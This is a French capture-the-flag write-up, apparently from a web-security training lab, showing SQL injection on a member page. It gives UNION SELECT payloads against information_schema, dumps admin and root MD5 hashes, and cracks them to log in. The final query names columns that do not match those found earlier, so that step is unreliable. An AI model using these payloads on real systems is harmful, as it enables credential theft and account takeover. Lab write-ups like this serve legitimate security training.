`ip`/index.php?page=member

Note: tous les codes suivants ont été insérés dans l'input liée au submit.

si on submit vide, on obtient:
*You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1*

En testant `1 OR 2`, on constate qu'une requete SQL est donc possible :
Voici notre bible pour ce flag : *http://www.sqlinjection.net/column-names/*

`TRUE` permet de valider l'expression précédente. `UNION` permet de coupler les résultats d'une première requête avec une seconde dont les composantes doivent être les mêmes.

`TRUE UNION SELECT table_schema, table_name FROM information_schema.tables`
Notamment, la table:


table_schema: Member_Brute_Force
table_name: db_default

`TRUE UNION SELECT table_name, column_name FROM information_schema.columns`
Notamment:
table_name: db_default
column_name: username
column_name: password

Ce qui permet de rechercher 2 par 2 (étant limités par l'UNION) les résultats pour chaques colonnes de la table users:
`TRUE UNION SELECT last_name, countersign FROM Member_Brute_Force.db_default`
Nous obtenons pour les utilisateurs suivants :
```
username: root
password: 3bf1114a986ba87ed28fc1b5884fc2f8

username: admin
password: 3bf1114a986ba87ed28fc1b5884fc2f8
```

soit en décrypté (md5): *shadow* (les 2 sont les mêmes). En allant sur la page de login (*`ip`/index.php?page=signin*), et en testant les combinaisons trouvées, nous retombons sur le flag !